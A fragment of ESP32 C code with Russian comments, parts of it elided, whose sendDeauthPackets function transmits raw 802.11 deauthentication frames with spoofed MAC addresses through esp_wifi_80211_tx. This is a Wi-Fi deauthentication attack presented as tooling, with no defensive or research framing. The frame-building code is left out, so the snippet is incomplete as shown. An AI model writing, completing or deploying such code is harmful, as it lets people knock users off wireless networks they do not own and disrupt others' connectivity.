...
// Это позволяет отправлять сырые пакеты с подмененными MAC-адресами
...
void sendDeauthPackets() {
    ...
    // Отправляем пакет
    // Примечание: На ESP32-C3 эта функция может требовать патча ядра или работать нестабильно
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(deauth_frame_t), false);
    
    if (err != ESP_OK) {
        // Если ошибка, пробуем еще раз, но тише в лог
        // Serial.print("TX Error: "); Serial.println(err);
    }
}
